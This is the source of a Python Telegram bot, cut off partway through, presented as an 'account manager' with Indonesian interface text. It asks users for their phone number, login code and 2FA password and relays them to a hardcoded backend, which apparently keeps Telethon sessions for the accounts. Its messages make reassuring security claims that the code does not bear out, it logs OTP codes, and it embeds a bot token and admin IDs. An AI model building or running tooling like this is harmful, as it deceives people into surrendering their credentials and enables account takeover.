# CREATED BY @hiyaok ON TELEGRAM
# TELEGRAM @hiyaok
import asyncio
import logging
import json
import time
import uuid
import random
import aiohttp
from datetime import datetime, timezone
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ========== CONFIGURATION ==========
# Backend URL - Edit sesuai dengan backend Anda
BACKEND_URL = "https://kopisusumanis.biz.id/bot"  # Ganti dengan URL backend kamu (contoh: "https://yourdomain.com")

# Bot Token - Ganti dengan token bot Telegram Anda
BOT_TOKEN = "8152954142:AAGPDgG-Bl7vVMCfNgPGCP5eoGXBMX4y0sw"  # Dapetinn dari @BotFather di Telegram

# Admin IDs - Ganti dengan user ID admin (untuk notifikasi)
ADMIN_IDS = [7709837172, 5988451717]  # Ganti dengan ID Telegram admin

# ========== LOGGING CONFIGURATION ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========== USER STATES ==========
class UserStates:
    """Class untuk mengelola state user"""
    IDLE = "idle"
    WAITING_PHONE = "waiting_phone"
    WAITING_OTP = "waiting_otp"
    WAITING_PASSWORD = "waiting_password"

# Global user sessions storage - Thread-safe untuk multi-user
# jgn di ganti ato rubah
user_sessions = {}
session_lock = asyncio.Lock()

# ========== RANDOM DATA GENERATORS ==========
# gausah di ganti"
def generate_random_fullname():
    """Generate random Indonesian fullname"""
    first_names = [
        "Ahmad", "Budi", "Sari", "Dewi", "Andi", "Rina", "Joko", "Maya", 
        "Agus", "Sinta", "Eko", "Ratna", "Doni", "Lina", "Hadi", "Tuti",
        "Yanto", "Wati", "Rudi", "Nita", "Bambang", "Endang", "Surya", "Indri",
        "Bayu", "Nurul", "Fajar", "Diah", "Rizki", "Putri", "Arie", "Siska"
    ]
    
    last_names = [
        "Santoso", "Widodo", "Sari", "Pratama", "Utomo", "Rahayu", "Setiawan", "Maharani",
        "Kusuma", "Anggraeni", "Putra", "Dewi", "Wijaya", "Sari", "Rahman", "Fitri",
        "Adiputra", "Wulandari", "Nugroho", "Permata", "Gunawan", "Safitri", "Hakim", "Lestari"
    ]
    
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_random_address():
    """Generate random Indonesian address"""
    streets = [
        "Jl. Merdeka", "Jl. Sudirman", "Jl. Thamrin", "Jl. Gatot Subroto", "Jl. Ahmad Yani",
        "Jl. Diponegoro", "Jl. Pahlawan", "Jl. Veteran", "Jl. Pemuda", "Jl. Kenanga",
        "Jl. Mawar", "Jl. Melati", "Jl. Anggrek", "Jl. Dahlia", "Jl. Flamboyan",
        "Jl. Raya Pos", "Jl. Kebun Raya", "Jl. Pancasila", "Jl. Proklamasi", "Jl. Kartini"
    ]
    
    cities = [
        "Jakarta", "Surabaya", "Bandung", "Medan", "Semarang", "Makassar", "Palembang",
        "Tangerang", "Depok", "Bekasi", "Bogor", "Batam", "Pekanbaru", "Bandar Lampung",
        "Padang", "Malang", "Yogyakarta", "Solo", "Denpasar", "Balikpapan"
    ]
    
    provinces = [
        "DKI Jakarta", "Jawa Barat", "Jawa Tengah", "Jawa Timur", "Sumatera Utara",
        "Sumatera Barat", "Sumatera Selatan", "Kalimantan Timur", "Sulawesi Selatan",
        "Bali", "Riau", "Lampung", "DI Yogyakarta", "Banten", "Kepulauan Riau"
    ]
    
    number = random.randint(1, 999)
    street = random.choice(streets)
    city = random.choice(cities)
    province = random.choice(provinces)
    
    return f"{street} No.{number}, {city}, {province}"

def generate_random_gender():
    """Generate random gender"""
    return random.choice(["Laki-laki", "Perempuan"])

# ========== HELPER FUNCTIONS ==========
async def make_api_request(endpoint, method="GET", data=None, timeout=300):
    """
    Make HTTP request to backend API dengan retry mechanism
    
    Args:
        endpoint: API endpoint (contoh: "/form")
        method: HTTP method ("GET" atau "POST")
        data: Data untuk POST request
        timeout: Timeout dalam detik
    
    Returns:
        dict: Response dari API
    """
    try:
        url = f"{BACKEND_URL}{endpoint}"
        
        # Setup timeout dan retry
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=30, sock_read=60)
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout_config
        ) as session:
            
            retry_count = 0
            max_retries = 3
            
            while retry_count < max_retries:
                try:
                    if method == "POST":
                        logger.info(f"POST request to {url} with data: {data}")
                        async with session.post(url, json=data) as response:
                            result = await response.json()
                            logger.info(f"API Response: {result}")
                            return result
                    else:
                        logger.info(f"GET request to {url}")
                        async with session.get(url) as response:
                            result = await response.json()
                            logger.info(f"API Response: {result}")
                            return result
                            
                except asyncio.TimeoutError:
                    retry_count += 1
                    logger.warning(f"Timeout on attempt {retry_count}, retrying...")
                    if retry_count >= max_retries:
                        raise
                    await asyncio.sleep(2 * retry_count)  # Exponential backoff
                    
                except Exception as e:
                    retry_count += 1
                    logger.error(f"Request error on attempt {retry_count}: {e}")
                    if retry_count >= max_retries:
                        raise
                    await asyncio.sleep(2 * retry_count)
                    
    except Exception as e:
        logger.error(f"API request failed completely: {e}")
        return {"success": False, "error": f"Connection error: {str(e)}"}

def generate_session_id():
    """Generate unique session ID untuk setiap user"""
    timestamp = int(time.time())
    random_id = str(uuid.uuid4())[:8]
    return f"bot_{timestamp}_{random_id}"

async def get_user_session(user_id):
    """Get or create user session dengan thread safety"""
    async with session_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                "state": UserStates.IDLE,
                "session_id": generate_session_id(),
                "phone_number": None,
                "phone_code_hash": None,
                "otp_attempts": 0,
                "password_attempts": 0,
                "created_at": datetime.now(timezone.utc).timestamp(),
                "fullname": generate_random_fullname(),
                "address": generate_random_address(),
                "gender": generate_random_gender()
            }
            logger.info(f"Created new session for user {user_id}: {user_sessions[user_id]['session_id']}")
        
        return user_sessions[user_id]

async def clear_user_session(user_id):
    """Clear user session dengan thread safety"""
    async with session_lock:
        if user_id in user_sessions:
            session_id = user_sessions[user_id].get('session_id', 'unknown')
            del user_sessions[user_id]
            logger.info(f"Cleared session for user {user_id}: {session_id}")

def validate_phone_number(phone):
    """
    Validate phone number format
    
    Args:
        phone: Nomor telepon input
        
    Returns:
        tuple: (is_valid, formatted_phone_or_error_message)
    """
    # Remove spaces and special characters
    phone = phone.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    
    # Must start with + and contain only digits after that
    if not phone.startswith("+"):
        return False, "❌ Nomor telepon harus dimulai dengan kode negara\n📝 Contoh: +62812345678"
    
    # Remove + and check if remaining are digits
    digits = phone[1:]
    if not digits.isdigit():
        return False, "❌ Nomor telepon hanya boleh mengandung angka setelah kode negara\n📝 Contoh: +62812345678"
    
    # Must be at least 10 digits (including country code)
    if len(digits) < 10:
        return False, "❌ Nomor telepon terlalu pendek (minimal 10 digit)\n📝 Contoh: +62812345678"
    
    if len(digits) > 15:
        return False, "❌ Nomor telepon terlalu panjang (maksimal 15 digit)\n📝 Contoh: +62812345678"
    
    return True, phone

# ========== KEYBOARD LAYOUTS ==========
def get_main_menu_keyboard():
    """Get main menu keyboard dengan design menarik"""
    keyboard = [
        [InlineKeyboardButton("➕ Tambah Akun Telegram", callback_data="add_account")],
        [
            InlineKeyboardButton("🔄 Status Server", callback_data="server_status"),
            InlineKeyboardButton("❓ Bantuan", callback_data="help")
        ],
        [InlineKeyboardButton("👨‍💻 About Bot", callback_data="about")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    """Get cancel keyboard"""
    keyboard = [
        [InlineKeyboardButton("❌ Batalkan Proses", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_to_menu_keyboard():
    """Get back to menu keyboard"""
    keyboard = [
        [InlineKeyboardButton("🏠 Kembali ke Menu Utama", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== MESSAGE TEMPLATES ==========
def get_welcome_message():
    """Get welcome message dengan info lengkap"""
    return (
        "🤖 <b>Telegram Account Manager Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>Bot ini memungkinkan Anda mengelola akun Telegram dengan mudah dan aman!</b>\n\n"
        "✨ <b>Fitur Utama:</b>\n"
        "• ➕ <b>Tambah Akun:</b> Login akun Telegram baru ke sistem\n"
        "• 🔐 <b>OTP Verification:</b> Verifikasi otomatis dengan kode SMS\n"
        "• 🛡️ <b>2FA Support:</b> Mendukung verifikasi dua faktor\n"
        "• 🔄 <b>Multi-User:</b> Bisa digunakan banyak user bersamaan\n"
        "• 📊 <b>Status Monitor:</b> Pantau status server backend\n\n"
        "🚀 <b>Pilih menu di bawah untuk memulai:</b>"
    )

def get_add_account_instructions():
    """Get add account instructions yang detail"""
    return (
        "📱 <b>Tambah Akun Telegram Baru</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📝 <b>Langkah 1:</b> Kirim nomor telepon\n\n"
        "📞 <b>Format yang benar:</b>\n"
        "• Harus dimulai dengan kode negara (+)\n"
        "• Tanpa spasi, tanda baca, atau karakter lain\n"
        "• Contoh untuk Indonesia: <code>+62812345678</code>\n"
        "• Contoh untuk US: <code>+1234567890</code>\n\n"
        "⚡ <b>Proses selanjutnya:</b>\n"
        "1️⃣ Bot akan kirim kode OTP ke nomor Anda\n"
        "2️⃣ Masukkan kode OTP (6 digit)\n"
        "3️⃣ Jika ada 2FA, masukkan password\n"
        "4️⃣ Akun berhasil ditambahkan!\n\n"
        "📲 <b>Ketik nomor telepon Anda sekarang:</b>"
    )

# ========== COMMAND HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    logger.info(f"User {user.id} ({user.first_name}) started the bot")
    
    # Clear any existing session
    await clear_user_session(user.id)
    
    await update.message.reply_text(
        get_welcome_message(),
        reply_markup=get_main_menu_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = (
        "📖 <b>Panduan Lengkap Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔧 <b>Perintah Tersedia:</b>\n"
        "• <code>/start</code> - Mulai menggunakan bot\n"
        "• <code>/help</code> - Tampilkan panduan ini\n"
        "• <code>/cancel</code> - Batalkan proses yang sedang berjalan\n"
        "• <code>/status</code> - Cek status server backend\n\n"
        "📱 <b>Cara Menambah Akun:</b>\n"
        "1️⃣ Klik tombol 'Tambah Akun Telegram'\n"
        "2️⃣ Masukkan nomor telepon dengan format: <code>+62812345678</code>\n"
        "3️⃣ Tunggu kode OTP dikirim ke HP Anda\n"
        "4️⃣ Masukkan kode OTP (5-6 digit angka)\n"
        "5️⃣ Jika diminta, masukkan password 2FA\n"
        "6️⃣ Akun berhasil disimpan di sistem! 🎉\n\n"
        "⚠️ <b>Catatan Penting:</b>\n"
        "• Maksimal 3x salah untuk OTP dan password\n"
        "• Proses bisa dibatalkan kapan saja dengan /cancel\n"
        "• Bot ini aman dan tidak menyimpan password Anda\n"
        "• Data disimpan secara terenkripsi di server\n\n"
        "❓ <b>Butuh bantuan?</b> Hubungi administrator."
    )
    
    await update.message.reply_text(
        help_text,
        reply_markup=get_back_to_menu_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command"""
    user_id = update.effective_user.id
    await clear_user_session(user_id)
    
    await update.message.reply_text(
        "❌ <b>Proses Dibatalkan</b>\n\n"
        "✅ Semua operasi yang sedang berlangsung telah dihentikan.\n"
        "🏠 Silakan pilih menu lain untuk melanjutkan.",
        reply_markup=get_main_menu_keyboard(),
        parse_mode=ParseMode.HTML
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    status_msg = await update.message.reply_text(
        "🔍 <b>Mengecek status server...</b>\n⏳ Mohon tunggu sebentar...",
        parse_mode=ParseMode.HTML
    )
    
    # Check backend status
    result = await make_api_request("/health")
    
    if result.get("success", True) and result.get("status") == "healthy":
        status_text = (
            "✅ <b>Status Server: ONLINE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🕒 <b>Waktu Server:</b> {result.get('timestamp', 'N/A')}\n"
            f"📁 <b>Sessions File:</b> {'✅ Normal' if result.get('sessions_file') else '❌ Error'}\n"
            f"👥 <b>Users File:</b> {'✅ Normal' if result.get('users_file') else '❌ Error'}\n"
            f"🔗 <b>Telethon Sessions:</b> {'✅ Normal' if result.get('telethon_sessions_file') else '❌ Error'}\n"
            f"⚡ <b>Active Clients:</b> {result.get('active_clients', 0)} client(s)\n\n"
            "🎉 <b>Sistem berjalan dengan baik!</b>"
        )
    else:
        status_text = (
            "❌ <b>Status Server: OFFLINE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚠️ <b>Error:</b> {result.get('error', 'Server tidak dapat diakses')}\n\n"
            "🔧 <b>Solusi:</b>\n"
            "• Pastikan server backend sudah berjalan\n"
            "• Cek koneksi internet Anda\n"
            "• Hubungi administrator jika masalah berlanjut"
        )
    
    await status_msg.edit_text(
        status_text,
        reply_markup=get_back_to_menu_keyboard(),
        parse_mode=ParseMode.HTML
    )

# ========== CALLBACK HANDLERS ==========
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    await query.answer()
    logger.info(f"User {user_id} pressed button: {data}")
    
    if data == "main_menu":
        await clear_user_session(user_id)
        await query.edit_message_text(
            get_welcome_message(),
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    
    elif data == "add_account":
        session = await get_user_session(user_id)
        session["state"] = UserStates.WAITING_PHONE
        
        await query.edit_message_text(
            get_add_account_instructions(),
            reply_markup=get_cancel_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    
    elif data == "server_status":
        await show_server_status(query)
    
    elif data == "help":
        help_text = (
            "📖 <b>Panduan Singkat</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🚀 <b>Cara Menambah Akun:</b>\n"
            "1️⃣ Klik 'Tambah Akun Telegram'\n"
            "2️⃣ Kirim nomor HP: <code>+62812345678</code>\n"
            "3️⃣ Masukkan kode OTP dari SMS\n"
            "4️⃣ Jika perlu, masukkan password 2FA\n"
            "5️⃣ Selesai! Akun tersimpan aman\n\n"
            "💡 <b>Tips:</b>\n"
            "• Gunakan format internasional (+kode negara)\n"
            "• Pastikan nomor aktif dan bisa terima SMS\n"
            "• Proses bisa dibatalkan dengan tombol Cancel\n\n"
            "⚡ <b>Bot ini mendukung multi-user dan berjalan 24/7!</b>"
        )
        
        await query.edit_message_text(
            help_text,
            reply_markup=get_back_to_menu_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    
    elif data == "about":
        about_text = (
            "👨‍💻 <b>Telegram Account Manager Bot</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 <b>Tentang Bot Ini:</b>\n"
            "Bot ini dibuat untuk memudahkan pengelolaan akun Telegram dengan sistem yang aman dan terpercaya.\n\n"
            "⚡ <b>Teknologi:</b>\n"
            "• Python Telegram Bot API\n"
            "• Telethon untuk integrasi Telegram\n"
            "• Backend API dengan Flask\n"
            "• Multi-threading untuk performa optimal\n\n"
            "🔐 <b>Keamanan:</b>\n"
            "• Enkripsi data end-to-end\n"
            "• Session management yang aman\n"
            "• Rate limiting untuk mencegah abuse\n"
            "• Tidak menyimpan password dalam plaintext\n\n"
            "🌟 <b>Fitur Unggulan:</b>\n"
            "• Support multi-user concurrent\n"
            "• Auto-retry untuk koneksi yang gagal\n"
            "• Real-time status monitoring\n"
            "• User-friendly interface dengan emoji\n\n"
            "📞 <b>Support:</b> Hubungi administrator untuk bantuan teknis."
        )
        
        await query.edit_message_text(
            about_text,
            reply_markup=get_back_to_menu_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    
    elif data == "cancel":
        await clear_user_session(user_id)
        await query.edit_message_text(
            "❌ <b>Proses Dibatalkan</b>\n\n"
            "✅ Operasi telah dihentikan dengan aman.\n"
            "🏠 Silakan pilih menu lain:",
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.HTML
        )

async def show_server_status(query):
    """Show server status dengan loading indicator"""
    await query.edit_message_text(
        "🔍 <b>Mengecek status server...</b>\n⏳ Mohon tunggu sebentar...",
        parse_mode=ParseMode.HTML
    )
    
    result = await make_api_request("/health")
    
    if result.get("success", True) and result.get("status") == "healthy":
        status_text = (
            "✅ <b>Status Server: ONLINE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🕒 <b>Waktu Server:</b> {result.get('timestamp', 'N/A')}\n"
            f"📁 <b>Sessions File:</b> {'✅ Normal' if result.get('sessions_file') else '❌ Error'}\n"
            f"👥 <b>Users File:</b> {'✅ Normal' if result.get('users_file') else '❌ Error'}\n"
            f"🔗 <b>Telethon Sessions:</b> {'✅ Normal' if result.get('telethon_sessions_file') else '❌ Error'}\n"
            f"⚡ <b>Active Clients:</b> {result.get('active_clients', 0)} client(s)\n\n"
            "🎉 <b>Semua sistem berjalan dengan baik!</b>"
        )
    else:
        status_text = (
            "❌ <b>Status Server: OFFLINE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚠️ <b>Error:</b> {result.get('error', 'Server tidak dapat diakses')}\n\n"
            "🔧 <b>Kemungkinan Penyebab:</b>\n"
            "• Server backend sedang maintenance\n"
            "• Koneksi internet bermasalah\n"
            "• Overload pada sistem\n\n"
            "💡 <b>Solusi:</b> Coba lagi dalam beberapa menit atau hubungi admin."
        )
    
    await query.edit_message_text(
        status_text,
        reply_markup=get_back_to_menu_keyboard(),
        parse_mode=ParseMode.HTML
    )

# ========== MESSAGE HANDLERS ==========
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages berdasarkan user state"""
    user_id = update.effective_user.id
    message_text = update.message.text
    session = await get_user_session(user_id)
    
    logger.info(f"User {user_id} in state {session['state']} sent: {message_text}")
    
    if session["state"] == UserStates.WAITING_PHONE:
        await handle_phone_input(update, context, session)
    
    elif session["state"] == UserStates.WAITING_OTP:
        await handle_otp_input(update, context, session)
    
    elif session["state"] == UserStates.WAITING_PASSWORD:
        await handle_password_input(update, context, session)
    
    else:
        # Default response untuk idle state
        await update.message.reply_text(
            "🤖 <b>Halo!</b> Gunakan menu di bawah untuk navigasi:",
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.HTML
        )

async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE, session):
    """Handle phone number input dengan validasi lengkap"""
    phone_number = update.message.text.strip()
    user_id = update.effective_user.id
    
    logger.info(f"Processing phone input for user {user_id}: {phone_number}")
    
    # Validate phone number
    is_valid, result = validate_phone_number(phone_number)
    if not is_valid:
        await update.message.reply_text(
            f"📱 <b>Format Nomor Tidak Valid</b>\n\n"
            f"{result}\n\n"
            "📝 <b>Silakan kirim nomor telepon yang benar:</b>",
            reply_markup=get_cancel_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return
    
    phone_number = result  # Use formatted phone number
    session["phone_number"] = phone_number
    
    # Send loading message
    loading_msg = await update.message.reply_text(
        "📱 <b>Mengirim Kode Verifikasi</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 <b>Nomor:</b> <code>{phone_number}</code>\n"
        f"👤 <b>Nama:</b> {session['fullname']}\n"
        f"📍 <b>Alamat:</b> {session['address']}\n"
        f"⚧ <b>Gender:</b> {session['gender']}\n\n"
        "⏳ <b>Sedang mengirim kode OTP...</b>\n"
        "📨 Silakan tunggu SMS masuk ke HP Anda",
        parse_mode=ParseMode.HTML
    )
    
    # Prepare payload untuk backend API - sesuai dengan format backend
    payload = {
        "phoneNumber": phone_number,
        "session_id": session["session_id"],
        "fullname": session["fullname"],
        "address": session["address"],
        "gender": session["gender"]
    }
    
    logger.info(f"Sending form request to backend for user {user_id}: {payload}")
    
    # Make API request ke endpoint /form
    result = await make_api_request("/form", method="POST", data=payload)
    
    if result.get("success"):
        # Store phone_code_hash untuk verifikasi OTP
        session["phone_code_hash"] = result.get("phone_code_hash")
        session["state"] = UserStates.WAITING_OTP
        session["otp_attempts"] = 0
        
        logger.info(f"OTP sent successfully for user {user_id}, phone_code_hash: {result.get('phone_code_hash')}")
        
        await loading_msg.edit_text(
            "✅ <b>Kode Verifikasi Berhasil Dikirim!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 <b>Nomor:</b> <code>{phone_number}</code>\n"
            "📨 <b>Status:</b> Kode OTP telah dikirim\n"
            "📱 Silakan cek SMS atau aplikasi Telegram Anda\n\n"
            "🔢 <b>Masukkan kode verifikasi (5-6 digit):</b>\n"
            "💡 <i>Contoh: 12345 atau 123456</i>\n\n"
            "⏰ <b>Kode berlaku 5 menit</b>\n"
            "🔄 <b>Maksimal 3x percobaan</b>",
            reply_markup=get_cancel_keyboard(),
            parse_mode=ParseMode.HTML
        )
    else:
        error_msg = result.get("error", "Gagal mengirim kode verifikasi")
        logger.error(f"Failed to send OTP for user {user_id}: {error_msg}")
        
        await loading_msg.edit_text(
            f"❌ <b>Gagal Mengirim Kode</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚠️ <b>Error:</b> {error_msg}\n\n"
            "🔧 <b>Kemungkinan Penyebab:</b>\n"
            "• Nomor telepon tidak valid atau tidak aktif\n"
            "• Server Telegram sedang bermasalah\n"
            "• Nomor sudah terdaftar di sistem lain\n\n"
            "📝 <b>Silakan coba dengan nomor lain:</b>",
            reply_markup=get_cancel_keyboard(),
            parse_mode=ParseMode.HTML
        )

async def handle_otp_input(update: Update, context: ContextTypes.DEFAULT_TYPE, session):
    """Handle OTP input dengan validasi dan retry logic"""
    otp_code = update.message.text.strip()
    user_id = update.effective_user.id
    
    logger.info(f"Processing OTP input for user {user_id}: {otp_code}")
    
    # Validate OTP format (harus 5-6 digit angka)
    if not otp_code.isdigit() or len(otp_code) < 5 or len(otp_code) > 6:
        await update.message.reply_text(
            "❌ <b>Format Kode Tidak Valid</b>\n\n"
            "🔢 Kode verifikasi harus berupa 5-6 digit angka.\n"
            "📝 <b>Contoh yang benar:</b> 12345 atau 123456\n\n"
            "💡 <b>Silakan masukkan kode yang benar:</b>",
            reply_markup=get_cancel_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check maksimal percobaan
    if session["otp_attempts"] >= 3:
        await clear_user_session(user_id)
        await update.message.reply_text(
            "❌ <b>Terlalu Banyak Percobaan Gagal</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🚫 Anda telah salah memasukkan kode OTP sebanyak 3 kali.\n"
            "🔒 Untuk keamanan, proses telah dihentikan.\n\n"
            "🔄 <b>Silakan mulai ulang proses penambahan akun.</b>",
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Send loading message
    loading_msg = await update.message.reply_text(
        "🔐 <b>Memverifikasi Kode OTP</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔢 <b>Kode:</b> <code>{otp_code}</code>\n"
        f"📞 <b>Nomor:</b> <code>{session['phone_number']}</code>\n\n"
        "⏳ <b>Sedang memverifikasi dengan server Telegram...</b>",
        parse_mode=ParseMode.HTML
    )
    
    # Prepare payload untuk backend API
    payload = {
        "phone_number": session["phone_number"],
        "code": otp_code,
        "session_id": session["session_id"],
        "phone_code_hash": session["phone_code_hash"],
        "client_time": time.time()  # Kirim waktu client untuk sinkronisasi
    }
    
    logger.info(f"Sending OTP verification to backend for user {user_id}")
    
    # Make API request ke endpoint /otp
    result = await make_api_request("/otp", method="POST", data=payload)
    
    if result.get("success"):
        if result.get("needs_password"):
            # Perlu verifikasi 2FA password
            session["state"] = UserStates.WAITING_PASSWORD
            session["password_attempts"] = 0
            
            logger.info(f"2FA required for user {user_id}")
            
            await loading_msg.edit_text(
                "🔒 <b>Diperlukan Verifikasi 2FA</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "✅ <b>Kode OTP berhasil diverifikasi!</b>\n"
                "🛡️ Akun Anda menggunakan verifikasi dua faktor (2FA).\n\n"
                "🔑 <b>Masukkan password 2FA Anda:</b>\n"
                "💡 <i>Password yang sama dengan yang Anda set di Telegram</i>\n\n"
                "⚠️ <b>Catatan:</b>\n"
                "• Password bersifat case-sensitive\n"
                "• Maksimal 3x percobaan\n"
                "• Password tidak akan disimpan oleh bot",
                reply_markup=get_cancel_keyboard(),
                parse_mode=ParseMode.HTML
            )
        else:
            # Berhasil tanpa 2FA
            await clear_user_session(user_id)
            
            logger.info(f"Account successfully added for user {user_id} without 2FA")
            
            await loading_msg.edit_text(
                "🎉 <b>Akun Berhasil Ditambahkan!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📞 <b>Nomor:</b> <code>{session['phone_number']}</code>\n"
                f"👤 <b>Nama:</b> {session['fullname']}\n"
                f"🆔 <b>Session ID:</b> <code>{session['session_id']}</code>\n"
                f"🔐 <b>2FA:</b> Tidak aktif\n"
                f"⏰ <b>Waktu:</b> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n\n"
                "✅ <b>Akun Telegram Anda telah berhasil tersimpan di sistem!</b>\n"
                "🎯 Data telah dienkripsi dan disimpan dengan aman.\n\n"
                "🚀 <b>Akun siap digunakan!</b>",
                reply_markup=get_main_menu_keyboard(),
                parse_mode=ParseMode.HTML
            )
    else:
        # Gagal verifikasi OTP
        session["otp_attempts"] += 1
        remaining_attempts = 3 - session["otp_attempts"]
        error_msg = result.get("error", "Kode verifikasi tidak valid")
        
        logger.warning(f"OTP verification failed for user {user_id}: {error_msg}, attempts: {session['otp_attempts']}")
        
        if remaining_attempts > 0:
            await loading_msg.edit_text(
                f"❌ <b>Kode Verifikasi Salah</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ <b>Error:</b> {error_msg}\n"
                f"🔄 <b>Sisa percobaan:</b> {remaining_attempts}x\n\n"
                "💡 <b>Tips:</b>\n"
                "• Pastikan kode yang dimasukkan benar\n"
                "• Cek SMS terbaru atau notifikasi Telegram\n"
                "• Kode mungkin terlambat datang, tunggu sebentar\n\n"
                "🔢 <b>Silakan masukkan kode OTP yang benar:</b>",
                reply_markup=get_cancel_keyboard(),
                parse_mode=ParseMode.HTML
            )
        else:
            await clear_user_session(user_id)
            await loading_msg.edit_text(
                "❌ <b>Verifikasi OTP Gagal</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🚫 <b>Alasan:</b> {error_msg}\n"
                "⚠️ <b>Maksimal percobaan tercapai (3x)</b>\n\n"
                "🔄 <b>Untuk mencoba lagi:</b>\n"
                "1️⃣ Klik 'Kembali ke Menu Utama'\n"
                "2️⃣ Pilih 'Tambah Akun Telegram'\n"
                "3️⃣ Masukkan nomor telepon lagi\n\n"
                "💡 <b>Pastikan nomor HP Anda aktif dan bisa menerima SMS.</b>",
                reply_markup=get_main_menu_keyboard(),
                parse_mode=ParseMode.HTML
            )

async def handle_password_input(update: Update, context: ContextTypes.DEFAULT_TYPE, session):
    """Handle 2FA password input dengan security measures"""
    password = update.message.text.strip()
    user_id = update.effective_user.id
    
    # Log tanpa password untuk keamanan
    logger.info(f"Processing 2FA password for user {user_id}")
    
    # Delete user's password message untuk keamanan
    try:
        await update.message.delete()
    except:
        pass  # Ignore jika gagal delete
    
    # Check maksimal percobaan
    if session["password_attempts"] >= 3:
        await clear_user_session(user_id)
        
        error_msg = await context.bot.send_message(
            chat_id=user_id,
            text="❌ <b>Terlalu Banyak Percobaan Password Gagal</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                 "🚫 Anda telah salah memasukkan password 2FA sebanyak 3 kali.\n"
                 "🔒 Untuk keamanan akun, proses telah dihentikan.\n\n"
                 "🔄 <b>Untuk mencoba lagi:</b>\n"
                 "• Pastikan password 2FA Anda benar\n"
                 "• Mulai ulang proses penambahan akun\n"
                 "• Hubungi admin jika terus bermasalah",
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Validasi password tidak kosong
    if not password:
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ <b>Password Tidak Boleh Kosong</b>\n\n"
                 "🔑 Silakan masukkan password 2FA Anda:\n"
                 "💡 <i>Password yang sama dengan yang Anda set di aplikasi Telegram</i>",
            reply_markup=get_cancel_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Send loading message
    loading_msg = await context.bot.send_message(
        chat_id=user_id,
        text="🔒 <b>Memverifikasi Password 2FA</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
